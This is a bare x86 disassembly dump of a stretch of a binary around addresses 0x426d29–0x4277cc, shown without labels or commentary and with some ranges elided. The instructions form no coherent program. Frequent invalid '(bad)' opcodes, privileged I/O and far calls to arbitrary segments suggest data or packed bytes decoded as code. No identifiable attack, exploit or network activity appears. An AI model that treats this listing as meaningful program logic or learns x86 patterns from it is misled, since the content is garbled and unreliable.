  426d29:	btc    edx,ebx
  426d2c:	repz in eax,0x5f
  426d2f:	push   ebx
  426d30:	sti    
  426d31:	push   edi
  426d32:	inc    esp
  426d33:	dec    esp
  426d34:	add    DWORD PTR [ebp+0x65bfdb29],0x4b
  426d3b:	popf   
  426d3c:	xchg   DWORD PTR [edx+0x7f],ebx
  426d3f:	stos   BYTE PTR es:[edi],al
  426d40:	lea    edi,[edx-0x496d0a39]
  426d46:	mov    esp,DWORD PTR [esi]
  426d48:	mov    ecx,0x6a516508
  426d4d:	sbb    esi,edx
  426d4f:	int3   
  426d50:	jb     0x426dc5
  426d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d53:	inc    ebx
  426d54:	cmp    eax,0xa17316b3
  426d59:	aad    0x7d
  426d5b:	sti    
  426d5c:	cmp    eax,0x33060ff
  426d61:	daa    
  426d62:	lahf   
  426d63:	cmp    eax,0xa3956a9c
  426d68:	adc    eax,0xc1c2b42f
  426d6d:	cli    
  426d6e:	out    0x85,eax
  426d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d71:	(bad)  
  426d72:	scas   eax,DWORD PTR es:[edi]
  426d73:	sub    dl,cl
  426d75:	aad    0xb8
  426d77:	adc    BYTE PTR [edx-0x1a],cl
  426d7a:	mov    WORD PTR [esi+0x46],es
  426d7d:	mov    ecx,0x3320dc62
  426d82:	call   0x4ad98cc4
  426d87:	sub    esp,DWORD PTR [edi]
  426d89:	cmp    dh,BYTE PTR [ebp-0x57cd244]
  426d8f:	push   ebx
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x300c:0xc7c2ecf9
  426e01:	fild   DWORD PTR [edx+0x19f0479]
  426e07:	add    BYTE PTR [ecx+eax*1],al
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	jl     0x426e08
  426e0e:	scas   eax,DWORD PTR es:[edi]
  426e0f:	cld    
  426e10:	mov    ecx,0xe9802db3
  426e15:	inc    esi
  426e16:	push   ebx
  426e17:	mov    ecx,0xa9a15aae
  426e1c:	shr    DWORD PTR [edx+0x5900b610],1
  426e22:	sbb    DWORD PTR [edx+0x36],edi
  426e25:	sbb    al,bl
  426e27:	jge    0x426e29
  426e29:	outs   dx,BYTE PTR ds:[esi]
  426e2a:	push   0xb8be591c
  426e2f:	(bad)  
  426e30:	ss jne 0x426ddf
  426e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e34:	call   0x3de29cc4
  426e39:	cmovnp edx,DWORD PTR [edi]
  426e3c:	je     0x426dbe
  426e3e:	pop    es
  426e3f:	int    0x7b
  426e41:	fucomip st,st(7)
  426e43:	sbb    BYTE PTR [ebp-0x298d029d],cl
  426e49:	rcl    DWORD PTR [ecx+edx*8+0x4c],0x90
  426e4e:	push   ebx
  426e4f:	shr    DWORD PTR [esi-0x46],1
  426e52:	jl     0x426e28
  426e54:	outs   dx,DWORD PTR ds:[esi]
  426e55:	mov    fs,WORD PTR [edi-0x2]
  426e58:	lahf   
  426e59:	dec    ecx
  426e5a:	and    ebx,edi
  426e5c:	sbb    eax,0xa3c5c6f
  426e61:	add    eax,0x1540cc7
  426e66:	pop    ebp
  426e67:	mov    edx,0xb1d0a390
  426e6c:	jno    0x426ebc
  426e6e:	les    edx,FWORD PTR [edi]
  426e70:	pop    esi
  426e71:	mov    ebx,?
  426e73:	jle    0x426e2a
  426e75:	add    eax,DWORD PTR [edx+0x52]
  426e78:	pop    ebx
  426e79:	pop    ds
  426e7a:	mov    al,0xc4
  426e7c:	(bad)  
  426e7d:	pop    ecx
  426e7e:	inc    BYTE PTR [edx]
  426e80:	(bad)  
  426e81:	nop
  426e82:	sbb    DWORD PTR [eax+0x5e4e072b],0x73
  426e89:	pusha  
  426e8a:	cdq    
  426e8b:	clc    
  426e8c:	pop    eax
  426e8d:	dec    ecx
  426e8e:	(bad)  
  426e8f:	jl     0x426e4d
  426e91:	es call 0xb306f1e9
  426e97:	mov    esi,0xebb1071a
  426e9c:	inc    ebp
  426e9d:	mov    ebx,0xbbf7628f
  426ea2:	sbb    esp,DWORD PTR [ecx-0x38]
  426ea5:	out    0x94,eax
  426ea7:	xor    BYTE PTR [edx+0x3244c482],bl
  426ead:	pop    eax
  426eae:	jl     0x426e4a
  426eb0:	push   ss
  426eb1:	jg     0x426e90
  426eb3:	push   edx
  426eb4:	dec    esp
  426eb5:	lea    esp,[esi+ebp*8-0x5a5ab2af]
  426ebc:	inc    edx
  426ebd:	sub    ch,BYTE PTR [eax+0x63]
  426ec0:	out    0xc9,eax
  426ec2:	cld    
  426ec3:	shl    esp,1
  426ec5:	inc    esi
  426ec6:	ss dec eax
  426ec8:	ss push esp
  426eca:	jecxz  0x426e9a
  426ecc:	inc    esp
  426ecd:	mov    ebx,0x70de2ed4
  426ed2:	pushf  
  426ed3:	cmc    
  426ed4:	cmc    
  426ed5:	pop    ebp
  426ed6:	cdq    
  426ed7:	adc    eax,0xd610077c
  426edc:	lahf   
  426edd:	jg     0x426e99
  426edf:	xor    BYTE PTR [edx+ebx*1],dl
  426ee2:	sbb    al,0x53
  426ee4:	imul   ebp,DWORD PTR [ebx],0x58a0a79b
  426eea:	mov    ecx,0xf0514085
  426eef:	mov    ecx,0x13b942ab
  426ef4:	adc    eax,0xccbf46
  426ef9:	mov    esp,0xb3b515b3
  426efe:	xchg   edx,eax
  426eff:	mov    edx,esi
  426f01:	xchg   esi,eax
  426f02:	push   esi
  426f03:	arpl   cx,si
  426f05:	inc    edx
  426f06:	mov    ecx,0x247d16e1
  426f0b:	sub    ch,BYTE PTR [ebx+0x60a7a]
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ebp+esi*4+0x85096cc],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	cmp    ch,bl
  426f8e:	pop    es
  426f8f:	pusha  
  426f90:	dec    esp
  426f91:	mov    ds:0x55ad1b1b,eax
  426f96:	sub    DWORD PTR [edi-0x7a],esi
  426f99:	jb     0x426f78
  426f9b:	jnp    0x426fb2
  426f9d:	add    eax,0x79346bbc
  426fa2:	mov    ebp,0xea0d7c84
  426fa7:	jle    0x426f88
  426fa9:	and    dh,cl
  426fab:	(bad)  
  426fae:	mov    ebp,0x77799b99
  426fb3:	out    0x38,al
  426fb5:	dec    eax
  426fb6:	jmp    0xbab94c5b
  426fbb:	pop    edx
  426fbc:	ret    
  426fbd:	xor    cl,BYTE PTR [eax+0x525ab7ea]
  426fc3:	push   cs
  426fc4:	dec    ecx
  426fc5:	fidivr DWORD PTR ds:0x2c0dba0a
  426fcb:	popa   
  426fcc:	daa    
  426fcd:	jecxz  0x426fa1
  426fcf:	loope  0x426ff8
  426fd1:	aam    0x59
  426fd3:	and    eax,0x140edfa2
  426fd8:	xor    edx,ebp
  426fda:	jecxz  0x427001
  426fdc:	pop    eax
  426fdd:	mov    edx,0x2ab01ca0
  426fe2:	inc    ebx
  426fe3:	repnz retf 0x24ab
  426fe7:	mov    eax,0xcc2306b4
  426fec:	fs pusha 
  426fee:	and    edi,DWORD PTR [ecx+esi*4]
  426ff1:	cmp    ch,BYTE PTR [esi-0x42]
  426ff4:	mov    ds:0x51f79bc8,al
  426ff9:	mov    esp,ecx
  426ffb:	stos   DWORD PTR es:[edi],eax
  426ffc:	sub    DWORD PTR [esi-0x64],eax
  426fff:	push   esi
  427000:	adc    eax,0x22a556
  427005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427006:	out    0xd5,eax
  427008:	(bad)  
  42700a:	and    BYTE PTR [edi],dl
  42700c:	retf   0xb1d8
  42700f:	dec    esi
  427010:	add    al,0xf7
  427012:	mov    ds:0xfa81ff96,al
  427017:	loop   0x427034
  427019:	mov    edx,DWORD PTR [edi]
  42701b:	fistp  WORD PTR [edi-0x7174bf72]
  427021:	mov    WORD PTR [eax-0x5],ds
  427024:	rcl    BYTE PTR [eax-0x77],0xc7
  427028:	jns    0x42706c
  42702a:	mov    dh,0x83
  42702c:	call   0xf566:0xdda50206
  427033:	ss inc esi
  427035:	mov    ecx,0xe66b3d4c
  42703a:	mov    al,ds:0xb67dcf7e
  42703f:	shrd   DWORD PTR [ebx+0x314264fc],edx,cl
  427046:	or     cl,0x46
  427049:	cmp    BYTE PTR [ecx-0x1d],0x3e
  42704d:	inc    eax
  42704e:	add    al,0xaf
  427050:	xor    al,BYTE PTR [ebp-0x5b]
  427053:	lds    esi,FWORD PTR [edi]
  427055:	xor    ch,dh
  427057:	es nop
  427059:	loopne 0x4270d0
  42705b:	add    dh,cl
  42705d:	add    DWORD PTR [esi],ebp
  42705f:	jecxz  0x42709c
  427061:	les    edi,FWORD PTR [ecx]
  427063:	repz shl BYTE PTR [esi+0x2b],cl
  427067:	ds mov ch,0x37
  42706a:	xor    BYTE PTR [ebp+0x61],ch
  42706d:	add    dh,BYTE PTR [eax-0x78]
  427070:	rol    BYTE PTR [edi-0x784d60a4],cl
  427076:	mov    WORD PTR [esi+0x20],?
  427079:	loopne 0x4270ab
  42707b:	clc    
  42707c:	cli    
  42707d:	push   ebx
  42707e:	sar    edi,0x9a
  427081:	test   eax,0xa3164979
  427086:	icebp  
  427087:	retf   
  427088:	cmp    al,0xd2
  42708a:	add    edi,DWORD PTR ds:0x18cdd69b
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xe6709d96
  427102:	sbb    eax,0x1a10c9a
  427107:	add    BYTE PTR [ecx+eax*1],al
  42710a:	add    BYTE PTR [eax],al
  42710c:	int3   
  42710d:	scas   eax,DWORD PTR es:[edi]
  42710e:	pop    edi
  42710f:	mov    ebp,0x1a6a33d9
  427114:	jl     0x4270e9
  427116:	gs addr16 int 0x54
  42711a:	dec    ecx
  42711b:	ror    BYTE PTR [esi-0x55cf35df],1
  427121:	in     eax,dx
  427122:	inc    eax
  427123:	jns    0x4270c4
  427125:	xor    BYTE PTR [eax+ebp*1-0x50],0x99
  42712a:	dec    esi
  42712b:	lods   al,BYTE PTR ds:[esi]
  42712c:	retf   0x6ca5
  42712f:	adc    eax,ebp
  427131:	or     DWORD PTR [ebx+0x41b9b53f],edx
  427137:	jg     0x427157
  427139:	cmp    edx,DWORD PTR [edi-0x5e]
  42713c:	(bad)  
  42713d:	lahf   
  42713e:	add    BYTE PTR [ebx-0x15b14cff],al
  427144:	and    eax,0xde06b6d0
  427149:	xlat   BYTE PTR ds:[ebx]
  42714a:	mov    eax,ds:0x18cf4c1a
  42714f:	xor    ebx,DWORD PTR [edi]
  427151:	add    BYTE PTR es:[ecx+0x6877baf3],dl
  427158:	sub    al,0xe3
  42715a:	jl     0x42718b
  42715c:	dec    ebp
  42715d:	sub    edi,DWORD PTR [eax+ebp*2]
  427160:	push   edi
  427161:	pop    eax
  427162:	or     al,0xb2
  427164:	mov    DWORD PTR [esi],ebp
  427166:	inc    ecx
  427167:	add    ecx,DWORD PTR [edx+0xa1e98e]
  42716d:	xchg   DWORD PTR [esp+eiz*4],esi
  427170:	scas   al,BYTE PTR es:[edi]
  427171:	xchg   ecx,eax
  427172:	and    eax,0x13a98588
  427177:	mov    edi,DWORD PTR [edx+0x42]
  42717a:	mov    BYTE PTR [ecx-0x2d18f16],0x87
  427181:	in     eax,dx
  427182:	ss cld 
  427184:	xor    dh,dh
  427186:	loope  0x427160
  427188:	push   es
  427189:	das    
  42718a:	iret   
  42718b:	not    BYTE PTR [edi]
  42718d:	leave  
  42718e:	cmp    al,0xa3
  427190:	and    bl,cl
  427192:	fcmovnb st,st(7)
  427194:	mov    ebx,0xac565dac
  427199:	jle    0x4271b8
  42719b:	adc    DWORD PTR [edi+0x9],ebx
  42719e:	rcr    DWORD PTR [edi+0x3c3763b],1
  4271a4:	inc    esi
  4271a5:	add    BYTE PTR [ebp+edi*1+0x6354a4ce],bl
  4271ac:	inc    edx
  4271ad:	mov    cs,WORD PTR [edi]
  4271af:	fsubr  st(7),st
  4271b1:	xor    DWORD PTR [esi+eiz*8+0x4a],ecx
  4271b5:	mov    ah,0x2
  4271b7:	enter  0x6d16,0xe
  4271bb:	sbb    ah,BYTE PTR [ecx-0x30]
  4271be:	scas   al,BYTE PTR es:[edi]
  4271bf:	test   bh,ch
  4271c1:	mov    bh,0x7a
  4271c3:	mov    al,ds:0x8ffe9fb0
  4271c8:	add    al,0xe3
  4271ca:	mov    esp,0xe1bab496
  4271cf:	xchg   DWORD PTR [edx-0xf914709],ebp
  4271d5:	ret    
  4271d6:	mov    al,0x67
  4271d8:	mov    BYTE PTR [edi],dl
  4271da:	setle  BYTE PTR [ebx+eax*4-0x13]
  4271df:	das    
  4271e0:	dec    edx
  4271e1:	cdq    
  4271e2:	in     al,dx
  4271e3:	add    ecx,DWORD PTR [edi-0x26800ace]
  4271e9:	sub    eax,0x807e3b6c
  4271ee:	lods   eax,DWORD PTR ds:[esi]
  4271ef:	mov    bl,0x31
  4271f1:	sbb    BYTE PTR [ebx+0xe],ch
  4271f4:	mov    ds:0xe88146b9,eax
  4271f9:	aas    
  4271fa:	ins    DWORD PTR es:[edi],dx
  4271fb:	add    esi,DWORD PTR [ebp+0x483db947]
  427201:	retf   
  427202:	mov    al,0x1e
  427204:	icebp  
  427205:	or     eax,0x8b87b1fe
  42720a:	jp     0x42720e
  42720c:	rol    DWORD PTR [ecx+0x27],cl
  42720f:	jns    0x427211
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xc697174,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	cli    
  42728d:	xchg   edx,eax
  42728e:	cmp    eax,0x257a64e0
  427293:	adc    eax,0x7745c492
  427298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427299:	stos   DWORD PTR es:[edi],eax
  42729a:	hlt    
  42729b:	mov    ds:0xc56079b5,eax
  4272a0:	out    0x51,eax
  4272a2:	jnp    0x42730c
  4272a4:	inc    sp
  4272a6:	jbe    0x4272fa
  4272a8:	fidivr WORD PTR [esi-0x3db6922]
  4272ae:	xchg   esi,eax
  4272af:	mov    dh,dl
  4272b1:	sub    eax,0xb461b40f
  4272b6:	inc    eax
  4272b7:	aaa    
  4272b8:	aam    0x20
  4272ba:	in     eax,dx
  4272bb:	enter  0x22c3,0x73
  4272bf:	and    eax,0x1a760a14
  4272c4:	inc    ebx
  4272c5:	push   0xffffffd3
  4272c7:	sbb    bl,dl
  4272c9:	jo     0x4272c3
  4272cb:	jl     0x42731d
  4272cd:	sub    cl,bl
  4272cf:	push   esi
  4272d0:	shl    BYTE PTR [edi+0x76],0x25
  4272d4:	ret    0x4007
  4272d7:	jo     0x4272dc
  4272d9:	lahf   
  4272da:	and    dh,BYTE PTR [ecx-0x732729b]
  4272e0:	mov    ch,0xab
  4272e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272e3:	pop    ecx
  4272e4:	mov    al,0x73
  4272e6:	test   eax,0x862c7ad4
  4272eb:	(bad)  
  4272ed:	call   0xb97a6eb6
  4272f2:	fwait
  4272f3:	cld    
  4272f4:	push   eax
  4272f5:	(bad)  
  4272f6:	jl     0x42729d
  4272f8:	sbb    eax,0xac193fd8
  4272fd:	pop    ecx
  4272fe:	dec    ecx
  4272ff:	xor    bh,dl
  427301:	add    bl,BYTE PTR [eax]
  427303:	inc    ebp
  427304:	sbb    BYTE PTR [edx],bl
  427306:	loop   0x427335
  427308:	aaa    
  427309:	cmp    dl,al
  42730b:	scas   eax,DWORD PTR es:[edi]
  42730c:	loop   0x4272e1
  42730e:	dec    ebx
  42730f:	jle    0x4272b7
  427311:	ret    
  427312:	(bad)  
  427314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427315:	or     DWORD PTR [esi-0x4e558d9f],0x8abb82c9
  42731f:	rol    DWORD PTR ss:[eax-0x4f],1
  427323:	or     DWORD PTR [ecx+0x43],edi
  427326:	sti    
  427327:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  427329:	mov    ah,0xbe
  42732b:	pushf  
  42732c:	pop    esp
  42732d:	jle    0x427332
  42732f:	popa   
  427330:	dec    ecx
  427331:	pop    ebp
  427332:	popf   
  427333:	je     0x4272d9
  427335:	cmp    ecx,ecx
  427337:	popf   
  427338:	sti    
  427339:	shl    DWORD PTR [ebp+ebx*2+0xd],1
  42733d:	push   ss
  42733e:	fwait
  42733f:	pop    edx
  427340:	imul   edi,esi,0x7b42ae55
  427346:	aaa    
  427347:	sahf   
  427348:	xchg   edi,eax
  427349:	sar    esi,cl
  42734b:	jne    0x42738c
  42734d:	loopne 0x427381
  42734f:	cmc    
  427350:	outs   dx,BYTE PTR ds:[esi]
  427351:	cmp    BYTE PTR [esi],ah
  427353:	cmp    BYTE PTR [edx+0x45739b5f],ch
  427359:	push   cs
  42735a:	push   esi
  42735b:	popa   
  42735c:	icebp  
  42735d:	jg     0x4272f1
  42735f:	jne    0x427380
  427361:	cs push esp
  427363:	mov    WORD PTR [ebx-0x75],cs
  427366:	push   es
  427367:	push   0xffffffe6
  427369:	xchg   BYTE PTR [esi],ch
  42736b:	xor    DWORD PTR [edi-0x44],edx
  42736e:	das    
  42736f:	sbb    BYTE PTR [edx],ch
  427371:	gs or  dh,ch
  427374:	add    ebp,DWORD PTR [ecx]
  427376:	lock int 0xac
  427379:	mov    eax,ds:0x7e3f7ef7
  42737e:	bound  ebp,QWORD PTR [ebp-0x2f]
  427381:	jge    0x4273d9
  427383:	mov    edx,0xc4693469
  427388:	mov    esp,DWORD PTR [edi+esi*4+0x34a806e9]
  42738f:	rol    DWORD PTR [eax],0x0
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,esp
  427401:	xor    edi,DWORD PTR [edi+0x3e]
  427404:	adc    al,0xa3
  427406:	add    DWORD PTR [eax],eax
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	dec    edi
  42740d:	clc    
  42740e:	in     al,0x20
  427410:	mov    eax,0x56361840
  427415:	dec    ecx
  427416:	sub    eax,0x4ff2a905
  42741b:	cmp    bl,BYTE PTR [ebx-0x505423be]
  427421:	or     BYTE PTR [esi-0x45443402],0xab
  427428:	lods   al,BYTE PTR ds:[esi]
  427429:	inc    ecx
  42742a:	pop    edi
  42742b:	int3   
  42742c:	jmp    0x7ba0:0x3378f063
  427433:	sub    dh,BYTE PTR [eax-0x16]
  427436:	test   al,0x44
  427438:	mov    BYTE PTR [eax+esi*8-0x78e55dc7],bl
  42743f:	data16 xor al,0xf9
  427442:	inc    edx
  427443:	mov    cl,0x5c
  427445:	adc    al,0x9b
  427447:	dec    edx
  427448:	ja     0x427430
  42744a:	adc    DWORD PTR [ecx],0x763d0b7d
  427450:	dec    ebx
  427451:	jmp    0xf753:0x80161c21
  427458:	mov    dl,0x50
  42745a:	mov    DWORD PTR [ecx-0xd],ebx
  42745d:	pop    ebp
  42745e:	or     DWORD PTR [edx-0x9],0x35
  427462:	xor    BYTE PTR [edx-0x3783d21d],bh
  427468:	scas   al,BYTE PTR es:[edi]
  427469:	jp     0x4274bc
  42746b:	lods   al,BYTE PTR ds:[esi]
  42746c:	jbe    0x427407
  42746e:	sbb    dh,ah
  427470:	and    dl,BYTE PTR [ecx+0x66]
  427473:	mov    edi,DWORD PTR [eax+0x13213e2]
  427479:	push   ds
  42747a:	push   esp
  42747b:	jle    0x4274ea
  42747d:	out    0x8,eax
  42747f:	sar    DWORD PTR [ebx+0x3872356d],0xb1
  427486:	xor    al,0xd8
  427488:	pop    ds
  427489:	dec    ecx
  42748a:	mov    ebp,0x8b454ad9
  42748f:	add    DWORD PTR [ecx+edx*4-0x6e],edi
  427493:	mov    al,0xf1
  427495:	mov    eax,ds:0x49e75025
  42749a:	dec    ax
  42749c:	dec    esi
  42749d:	xchg   BYTE PTR [ebp-0x16],cl
  4274a0:	mov    bl,0x7d
  4274a2:	sbb    esi,esi
  4274a4:	pop    ebx
  4274a5:	fild   DWORD PTR [esi]
  4274a7:	mov    ds:0x744aaf0,eax
  4274ac:	icebp  
  4274ad:	or     cl,dh
  4274af:	aaa    
  4274b0:	and    BYTE PTR [eax+0x6c84ba33],cl
  4274b6:	push   es
  4274b7:	mov    al,0x42
  4274b9:	mov    es,edx
  4274bb:	xchg   ecx,eax
  4274bc:	or     al,0xee
  4274be:	add    bh,BYTE PTR [ecx+ebp*8]
  4274c1:	ja     0x4274cc
  4274c3:	aas    
  4274c4:	dec    edx
  4274c5:	pop    es
  4274c6:	cs in  eax,dx
  4274c8:	and    dh,BYTE PTR [edi+0x492ddc78]
  4274ce:	stos   BYTE PTR es:[edi],al
  4274cf:	mov    dl,0xcb
  4274d1:	stos   BYTE PTR es:[edi],al
  4274d2:	retf   
  4274d3:	imul   edx,DWORD PTR [eax+0x68],0xe5cd59d0
  4274da:	mov    ds:0x413b410d,al
  4274df:	jo     0x427484
  4274e1:	add    eax,0xe81881e6
  4274e6:	mov    al,0xd0
  4274e8:	hlt    
  4274e9:	pop    ebx
  4274ea:	pop    ds
  4274eb:	xor    dl,bl
  4274ed:	call   0xe624:0x4845f598
  4274f4:	sub    esp,DWORD PTR [ecx]
  4274f6:	or     BYTE PTR [edx+edx*4+0xf0361de],ch
  4274fd:	or     ch,bl
  4274ff:	push   es
  427500:	repz std 
  427502:	fsub   QWORD PTR [eax+0x24]
  427505:	and    al,0x85
  427507:	push   esp
  427508:	imul   eax,DWORD PTR [ecx-0x2c096227],0xffffffeb
  42750f:	inc    esi
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	sub    eax,eax
  427582:	or     BYTE PTR [edi],bl
  427584:	sbb    BYTE PTR [ecx+eax*1+0x10400],ah
  42758b:	add    ch,ah
  42758d:	or     al,0x9d
  42758f:	pop    ebx
  427590:	jnp    0x4275ee
  427592:	dec    ebp
  427593:	test   eax,0x5587ddc6
  427598:	in     al,dx
  427599:	xlat   BYTE PTR ds:[ebx]
  42759a:	loop   0x4275fe
  42759c:	mov    ch,BYTE PTR [edx]
  42759e:	mov    esp,0x11ea2800
  4275a3:	out    dx,eax
  4275a4:	out    0x6c,eax
  4275a6:	cld    
  4275a7:	jg     0x4275cb
  4275a9:	mov    edi,0x304bb501
  4275ae:	pop    es
  4275af:	mov    esp,0x56250ba7
  4275b5:	dec    ebx
  4275b6:	fnstenv [ebp+ebp*4+0x33f3339a]
  4275bd:	push   cs
  4275be:	arpl   WORD PTR [edi+0x64],di
  4275c1:	jns    0x427619
  4275c3:	pusha  
  4275c4:	out    dx,al
  4275c5:	mov    esi,0xdced3db0
  4275ca:	mov    dl,0xe
  4275cc:	repz popa 
  4275ce:	jne    0x427595
  4275d0:	xchg   esi,eax
  4275d1:	xchg   ebx,eax
  4275d2:	stc    
  4275d3:	mov    edi,DWORD PTR cs:[ecx+0x77]
  4275d7:	(bad)  
  4275d8:	or     BYTE PTR [ecx+0x345f79d7],0xc4
  4275df:	fcmovne st,st(6)
  4275e1:	cmp    eax,0xdc52a8d6
  4275e6:	fsubr  QWORD PTR [edi]
  4275e8:	sub    DWORD PTR [esi],ecx
  4275ea:	xchg   edi,eax
  4275eb:	and    DWORD PTR [ecx+eax*8],ebx
  4275ee:	inc    ebx
  4275ef:	or     edi,DWORD PTR [esi+0x314d24a2]
  4275f5:	lahf   
  4275f6:	test   eax,0x3773f613
  4275fb:	cmp    ebp,DWORD PTR [ecx+esi*2]
  4275fe:	pushf  
  4275ff:	mov    DWORD PTR [ebx],eax
  427601:	dec    esi
  427602:	enter  0xdcf4,0xad
  427606:	sahf   
  427607:	xchg   edx,eax
  427608:	aad    0x1e
  42760a:	xchg   edi,eax
  42760b:	sub    al,0x60
  42760d:	loop   0x427682
  42760f:	icebp  
  427610:	push   eax
  427611:	jnp    0x4275eb
  427613:	mov    dh,0x41
  427615:	iret   
  427616:	test   al,0xce
  427618:	push   cs
  427619:	jl     0x42765f
  42761b:	call   0xaef24d73
  427620:	leave  
  427621:	jle    0x427672
  427623:	imul   esp,DWORD PTR [ecx+0x3fd2ec8c],0x51
  42762a:	add    DWORD PTR [edx+ebp*4-0x6f],edx
  42762e:	inc    ebx
  42762f:	outs   dx,DWORD PTR ds:[esi]
  427630:	cmp    DWORD PTR [ebx],eax
  427632:	pop    eax
  427633:	sub    BYTE PTR [eax+0x6b],0x91
  427637:	pop    ecx
  427638:	mov    ch,0xc7
  42763a:	stos   DWORD PTR es:[edi],eax
  42763b:	jle    0x427630
  42763d:	mov    ebp,0xcd055a77
  427642:	mov    dl,0xc7
  427644:	pop    ecx
  427645:	sub    al,0xcc
  427647:	in     eax,0xcf
  427649:	push   ecx
  42764a:	ficom  WORD PTR [edi-0x71a6acc2]
  427650:	in     al,dx
  427651:	xor    edi,eax
  427653:	push   ecx
  427654:	xor    eax,0xd40ad293
  427659:	push   esi
  42765a:	(bad)  
  42765b:	pop    ds
  42765c:	fwait
  42765d:	in     eax,dx
  42765e:	jecxz  0x427615
  427660:	lds    esp,FWORD PTR [eax+0x2a]
  427663:	fwait
  427664:	mov    cl,0x50
  427666:	adc    eax,0x92cbe9bb
  42766b:	sbb    DWORD PTR [edi+0x2830bc4e],0x993e8f3f
  427675:	cmc    
  427676:	inc    edx
  427677:	adc    BYTE PTR [ebp+0x4a4a29e1],ah
  42767d:	jo     0x427683
  42767f:	js     0x4276c6
  427681:	arpl   WORD PTR [edi],ax
  427683:	or     eax,0x296bc563
  427688:	(bad)  
  427689:	nop
  42768a:	pop    esp
  42768b:	adc    eax,0x5925526b
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	frndint 
  427701:	jl     0x4276ac
  427703:	jno    0x427721
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	leave  
  42770d:	mov    bl,0x23
  42770f:	outs   dx,BYTE PTR ds:[esi]
  427710:	or     eax,0xff297dd8
  427715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427716:	cwde   
  427717:	sub    al,0x46
  427719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42771a:	inc    edx
  42771b:	enter  0xfa76,0x3e
  42771f:	xchg   ebx,eax
  427720:	aad    0xf5
  427722:	ret    0xd78
  427725:	sbb    DWORD PTR [eax+0x525f90b4],ebx
  42772b:	dec    esp
  42772c:	xchg   DWORD PTR [esi-0x73],esp
  42772f:	enter  0x90ba,0x14
  427733:	bound  ebx,QWORD PTR [ebp+0x12ed508b]
  427739:	fild   WORD PTR [edx]
  42773b:	pop    ebx
  42773c:	sahf   
  42773d:	stc    
  42773e:	retf   
  42773f:	mov    esp,eax
  427741:	cmp    ecx,DWORD PTR [eax-0x60]
  427744:	in     eax,dx
  427745:	and    ebp,DWORD PTR [eax+0xde95b83]
  42774b:	add    esi,edx
  42774d:	pushf  
  42774e:	mov    ds:0x67e6cfeb,eax
  427753:	lods   eax,DWORD PTR ds:[esi]
  427754:	imul   edi,ebp,0xffffffb8
  427757:	mov    ss,WORD PTR [eax+0x31408a38]
  42775d:	rcl    ch,0xd8
  427760:	and    dl,BYTE PTR [ebx]
  427762:	mov    ds:0x9ae5df7c,al
  427767:	inc    edi
  427768:	jmp    0xd7dfe400
  42776d:	ficomp WORD PTR [ebx-0x35]
  427770:	sub    DWORD PTR [ebp-0xfa1844a],0x2c
  427777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427778:	es fwait
  42777a:	push   cs
  42777b:	fnsave [eax+0x2e]
  42777e:	retf   
  42777f:	retf   0xce2b
  427782:	mov    eax,ds:0x3ae4d846
  427787:	jo     0x427773
  427789:	imul   ebp,DWORD PTR [ebx+0x5900bcdd],0xffffff8d
  427790:	adc    al,0x31
  427792:	inc    ebp
  427793:	out    0xb2,eax
  427795:	repnz mov BYTE PTR [esi-0x40bc89bb],bl
  42779c:	out    dx,eax
  42779d:	dec    eax
  42779e:	pushf  
  42779f:	and    al,ah
  4277a1:	inc    eax
  4277a2:	mov    esi,0xa5c9e20d
  4277a7:	neg    ecx
  4277a9:	rcr    BYTE PTR [edi-0x705c22cf],cl
  4277af:	test   al,0xc6
  4277b1:	loope  0x4277f7
  4277b3:	xchg   esp,eax
  4277b4:	push   ebp
  4277b5:	pusha  
  4277b6:	add    DWORD PTR [eax],ebp
  4277b8:	pop    esi
  4277b9:	sub    eax,edx
  4277bb:	popa   
  4277bc:	push   ds
  4277bd:	faddp  st(7),st
  4277bf:	dec    edx
  4277c0:	jae    0x427812
  4277c2:	aam    0x19
  4277c4:	cmp    DWORD PTR [edi+0x482045c2],esp
  4277ca:	inc    edi
  4277cb:	push   ebx
  4277cc:	call   0xc495:0x9752f353
